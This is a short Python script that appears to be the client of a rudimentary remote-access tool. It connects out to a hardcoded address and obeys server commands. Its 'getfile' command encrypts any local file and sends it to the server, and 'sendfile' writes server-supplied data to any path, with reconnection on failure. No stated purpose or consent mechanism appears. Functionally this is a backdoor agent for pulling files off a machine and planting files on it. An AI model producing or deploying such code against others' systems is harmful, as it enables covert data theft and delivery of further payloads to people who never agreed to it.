import os
import socket
from time import sleep
from protocol import send_data, recv_data, encrypt_file, decrypt_file

HOST = '192.168.0.10'
PORT = 8080

s = socket.socket()

def main():
    try:
        s.connect((HOST, PORT))
        key = recv_data(s)
        session(key)
    except:
        sleep(500)
        s.connect((HOST, PORT))
        key = recv_data(s)
        session(key)

def session(key):
    while True:
        data = s.recv(128)
        cmd = str(data, encoding="utf-8", errors="ignore")

        if cmd == 'shutdown':
            s.close()
            exit(0)

        elif cmd[:7] == "getfile":
            nonce, tag, text = encrypt_file(key, cmd[8:])
            send_data(nonce, s)
            send_data(tag, s)
            send_data(text, s)

        elif cmd == "cd":
            pwd = os.getcwd()
            send_data(pwd, s)

        elif cmd == "ls":
            files = ", ".join([f for f in os.listdir(os.getcwd())])
            send_data(files, s)

        elif cmd[:8] == 'sendfile':
            nonce = recv_data(s)
            tag = recv_data(s)
            text = recv_data(s)
            try:
                file = decrypt_file(key, nonce, tag, text)
                with open(cmd[9:], "wb") as f:
                    f.write(file)
            except Exception as e:
                raise
            f.close()

if __name__ == '__main__':
    main()